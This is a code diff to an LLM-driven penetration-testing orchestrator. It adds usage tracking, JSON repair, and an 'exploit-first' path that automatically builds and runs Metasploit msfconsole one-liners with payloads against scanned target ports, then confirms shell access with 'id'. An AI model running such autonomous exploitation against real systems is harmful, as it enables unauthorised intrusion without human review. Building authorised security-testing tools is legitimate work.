@@ -11,7 +11,20 @@ from app.agents.exploit_db import get_exploits_for_service
 from app.agents.mission_exceptions import MissionCancelled  # noqa: F401 (re-export)
 from app.agents.tester import get_tester_agent
 from app.agents.tools import kali_lhost, kali_tool
+from app.agents.usage import extract_usage
 from app.core.config import settings
+
+# Provider serving the manager/scanner LLM calls in this orchestrator.
+_GEMINI_PROVIDER = "gemini"
+
+
+class LLMResponseError(Exception):
+    """The model returned something we could not parse as the expected JSON.
+
+    Raised by `_generate` only after a repair attempt fails, so callers can
+    degrade gracefully (skip a port, extract no services) instead of letting a
+    single bad response fail the whole mission.
+    """
 
 # Evidence that a command actually achieved access/execution on the target.
 _CONFIRM_PATTERNS = [
@@ -83,6 +96,18 @@ class NoOpReporter:
     def mission_status(self, status: str, error: Optional[str] = None) -> None:
         pass
 
+    def record_usage(
+        self,
+        agent: str,
+        model: str,
+        provider: str,
+        prompt_tokens: int,
+        completion_tokens: int,
+        total_tokens: int,
+        latency_seconds: float,
+    ) -> None:
+        pass
+
 
 class HybridOrchestratorV2:
     def __init__(
@@ -136,6 +161,64 @@ class HybridOrchestratorV2:
         text = output or ""
         return any(re.search(p, text, re.IGNORECASE) for p in _CONFIRM_PATTERNS)
 
+    # Keep the TAIL of command output in history/findings: for msfconsole the
+    # proof (session opened, `id` output) lands at the END, so slicing from the
+    # start ([:N]) threw away exactly the evidence the LLM needs to see (#1).
+    _OUTPUT_TAIL = 2500
+
+    def _build_msf_command(self, module: str, payload: Optional[str], port: int) -> str:
+        """Non-interactive, self-terminating msfconsole one-liner for a known module.
+
+        Same shape the manager prompt asks the LLM to produce, so exploit-first
+        attempts are copy-paste reproducible and look identical in findings.
+        """
+        opts = f"set RHOSTS {self.target}; set RPORT {port}; "
+        if payload:
+            opts += f"set PAYLOAD {payload}; "
+        command = (
+            f'msfconsole -q -x "use {module}; {opts}'
+            f'run -z; sessions -c id; exit -y"'
+        )
+        return self._with_lhost(command)
+
+    def _record_attempt(
+        self,
+        *,
+        port: int,
+        name: str,
+        action: str,
+        command: str,
+        cmd_output: str,
+        reasoning: str,
+        history: List[dict],
+        attempts: int,
+    ) -> bool:
+        """Append an attempt to history, persist the finding + port status.
+
+        Returns whether the command looks confirmed, so the caller can decide to
+        short-circuit (#2).
+        """
+        confirmed = self._looks_confirmed(cmd_output)
+        history.append(
+            {
+                "command_sent": command,
+                "terminal_output": cmd_output[-self._OUTPUT_TAIL:],
+            }
+        )
+        self.reporter.finding(
+            {
+                "port": port,
+                "service_name": name,
+                "action": action,
+                "command": command,
+                "output": cmd_output[-4000:],
+                "reasoning": reasoning,
+                "confirmed": confirmed,
+            }
+        )
+        self.reporter.port_status(port, "in_progress", attempts, history)
+        return confirmed
+
     # def _execute_micro_task(
     #     self, command_to_run: str, expected_description: str
     # ) -> str:
@@ -167,7 +250,30 @@ class HybridOrchestratorV2:
                 return float(match.group(1)) + 1.0  # small cushion
         return fallback
 
-    def _generate(self, prompt: str, schema, _retry: int = 0) -> dict:
+    @staticmethod
+    def _loads_or_repair(text: Optional[str]) -> dict:
+        """Parse model output as JSON, repairing a stray prose wrapper if needed.
+
+        Raises LLMResponseError if nothing JSON-shaped can be recovered, so the
+        caller can degrade gracefully rather than crashing the mission (#3).
+        """
+        if not text:
+            raise LLMResponseError("empty model response")
+        try:
+            return json.loads(text)
+        except (json.JSONDecodeError, TypeError):
+            # Models occasionally wrap JSON in prose or code fences despite the
+            # response schema. Recover the first {...} block as a best effort.
+            cleaned = re.sub(r"```json|```", "", text)
+            match = re.search(r"\{.*\}", cleaned, re.DOTALL)
+            if match:
+                try:
+                    return json.loads(match.group())
+                except json.JSONDecodeError:
+                    pass
+            raise LLMResponseError("model returned non-JSON output")
+
+    def _generate(self, prompt: str, schema, agent: str, _retry: int = 0) -> dict:
         global _last_call_ts
 
         wait = _MIN_SECONDS_BETWEEN_CALLS - (time.monotonic() - _last_call_ts)
@@ -175,6 +281,7 @@ class HybridOrchestratorV2:
             time.sleep(wait)
 
         try:
+            started = time.monotonic()
             resp = gemini_client.models.generate_content(
                 contents=prompt,
                 model=settings.GEMINI_MODEL,
@@ -183,7 +290,26 @@ class HybridOrchestratorV2:
                     response_schema=schema,
                 ),
             )
-            return json.loads(resp.text)
+            latency = time.monotonic() - started
+            # Record usage the moment the call returns — before parsing — so the
+            # tokens we spent are counted even if the body turns out unparseable.
+            prompt_tokens, completion_tokens, total_tokens = extract_usage(
+                resp, _GEMINI_PROVIDER
+            )
+            self.reporter.record_usage(
+                agent=agent,
+                model=settings.GEMINI_MODEL,
+                provider=_GEMINI_PROVIDER,
+                prompt_tokens=prompt_tokens,
+                completion_tokens=completion_tokens,
+                total_tokens=total_tokens,
+                latency_seconds=latency,
+            )
+            return self._loads_or_repair(resp.text)
+        except LLMResponseError:
+            # Parsing failure: do NOT retry the network (we got a 200), just
+            # bubble up so the caller can skip/degrade.
+            raise
         except Exception as e:
             msg = str(e)
             is_rate_limit = "429" in msg or "RESOURCE_EXHAUSTED" in msg
@@ -206,7 +332,7 @@ class HybridOrchestratorV2:
                     f"(retry {_retry + 1}/{_MAX_RETRIES})...",
                 )
                 time.sleep(delay)
-                return self._generate(prompt, schema, _retry=_retry + 1)
+                return self._generate(prompt, schema, agent, _retry=_retry + 1)
             raise
         finally:
             _last_call_ts = time.monotonic()
@@ -228,7 +354,16 @@ class HybridOrchestratorV2:
             "Analyze this raw Nmap output and extract all active "
             f"services:\n{raw_nmap_output}"
         )
-        scan_data = self._generate(parse_prompt, InitialScanOutput)
+        try:
+            scan_data = self._generate(parse_prompt, InitialScanOutput, agent="scanner")
+        except LLMResponseError as e:
+            # Don't fail the whole mission over an unparseable parse response.
+            self._emit_log(
+                "Manager",
+                f"Could not parse Nmap output ({e}); no services extracted.",
+                "warning",
+            )
+            scan_data = {"services": []}
 
         services = [
             {
@@ -283,12 +418,55 @@ class HybridOrchestratorV2:
             )
 
             port_completed = False
+            known_exploits = get_exploits_for_service(name, version)
+
+            # EXPLOIT-FIRST (#4): when we have high-confidence known modules for
+            # this service, run them directly — no LLM round-trip — on a fresh
+            # port. The manager LLM is consulted only if these don't land. Skipped
+            # on resume (history already present) to avoid re-running attempts.
+            if known_exploits and not history_of_this_port:
+                self._emit_log(
+                    f"Manager [Port {port}]",
+                    f"Exploit-first: trying {len(known_exploits)} known module(s) "
+                    "before consulting the LLM.",
+                )
+                for module, payload, desc in known_exploits:
+                    self._check_cancel()
+                    if attempts >= 5:
+                        break
+                    attempts += 1
+                    command = self._build_msf_command(module, payload, port)
+                    self._emit_log(
+                        f"Tester [Port {port}]", f"Known exploit: {module} ({desc})"
+                    )
+                    cmd_output = self._execute_micro_task(
+                        command_to_run=command,
+                        expected_description=f"Known exploit on port {port}: {desc}",
+                    )
+                    confirmed = self._record_attempt(
+                        port=port,
+                        name=name,
+                        action="EXECUTE_ATTACK",
+                        command=command,
+                        cmd_output=cmd_output,
+                        reasoning=f"Exploit-first known module: {desc}",
+                        history=history_of_this_port,
+                        attempts=attempts,
+                    )
+                    # SHORT-CIRCUIT (#2): a confirmed session ends the port now.
+                    if confirmed:
+                        self._emit_log(
+                            f"Manager [Port {port}]",
+                            "Confirmed access via known exploit; closing port.",
+                            "success",
+                        )
+                        port_completed = True
+                        break
+
             while not port_completed and attempts < 5:
                 self._check_cancel()
                 attempts += 1
 
-                # Consult exploit DB for known vulnerabilities
-                known_exploits = get_exploits_for_service(name, version)
                 exploit_hint = ""
                 if known_exploits:
                     exploit_hint = "\n\nKNOWN EXPLOITS FOR THIS SERVICE (try these in order if automated discovery fails):\n"
@@ -315,49 +493,68 @@ class HybridOrchestratorV2:
                     "- Proof of exploitation: ALWAYS include a proof command (id, whoami, pwd, uname) in the sessions -c clause. If sessions -c fails silently, consider the exploit unconfirmed and try a different payload or approach on the next attempt.\n"  # noqa: E501
                 )
 
-                decision = self._generate(manager_prompt, NextStepDecision)
-
-                self._emit_log(
-                    f"Manager [Port {port}]",
-                    f"Decision: {decision['action']} -> {decision['reasoning']}",
-                )
-
-                if decision["action"] in ["NEXT_PORT", "COMPLETED"]:
+                # Defensive parse (#3): an unparseable decision skips the port
+                # instead of crashing the mission.
+                try:
+                    decision = self._generate(
+                        manager_prompt, NextStepDecision, agent="manager"
+                    )
+                except LLMResponseError as e:
+                    self._emit_log(
+                        f"Manager [Port {port}]",
+                        f"Unparseable LLM decision ({e}); moving to next port.",
+                        "warning",
+                    )
                     port_completed = True
                     continue
 
-                if decision["specific_command"]:
-                    # LHOST injected here so BOTH the executed command and the
-                    # stored finding command are identical and copy-paste runnable.
-                    command = self._with_lhost(decision["specific_command"])
-                    cmd_output = self._execute_micro_task(
-                        command_to_run=command,
-                        expected_description=f"Testing vulnerability on port {port}",  # noqa: E501
-                    )
+                action = decision.get("action")
+                reasoning = decision.get("reasoning", "")
+                self._emit_log(
+                    f"Manager [Port {port}]",
+                    f"Decision: {action} -> {reasoning}",
+                )
 
-                    history_of_this_port.append(
-                        {
-                            "command_sent": command,
-                            "terminal_output": cmd_output[:2000],
-                        }
-                    )
+                if action in ("NEXT_PORT", "COMPLETED") or action is None:
+                    port_completed = True
+                    continue
 
-                    # Each executed step is a durable finding, pushed live and
-                    # persisted the moment it happens.
-                    self.reporter.finding(
-                        {
-                            "port": port,
-                            "service_name": name,
-                            "action": decision["action"],
-                            "command": command,
-                            "output": cmd_output[:4000],
-                            "reasoning": decision["reasoning"],
-                            "confirmed": self._looks_confirmed(cmd_output),
-                        }
+                command = decision.get("specific_command")
+                if not command:
+                    # Action asked for execution but gave no command: don't burn
+                    # the attempt silently — log and let the next iteration retry.
+                    self._emit_log(
+                        f"Manager [Port {port}]",
+                        f"Action '{action}' had no specific_command; skipping attempt.",
+                        "warning",
                     )
-                    self.reporter.port_status(
-                        port, "in_progress", attempts, history_of_this_port
+                    continue
+
+                # LHOST injected here so BOTH the executed command and the
+                # stored finding command are identical and copy-paste runnable.
+                command = self._with_lhost(command)
+                cmd_output = self._execute_micro_task(
+                    command_to_run=command,
+                    expected_description=f"Testing vulnerability on port {port}",
+                )
+                confirmed = self._record_attempt(
+                    port=port,
+                    name=name,
+                    action=action,
+                    command=command,
+                    cmd_output=cmd_output,
+                    reasoning=reasoning,
+                    history=history_of_this_port,
+                    attempts=attempts,
+                )
+                # SHORT-CIRCUIT (#2): stop as soon as access is proven.
+                if confirmed:
+                    self._emit_log(
+                        f"Manager [Port {port}]",
+                        "Confirmed access; closing port without further LLM calls.",
+                        "success",
                     )
+                    port_completed = True
 
             service["status"] = "completed"
             service["attempts"] = attempts
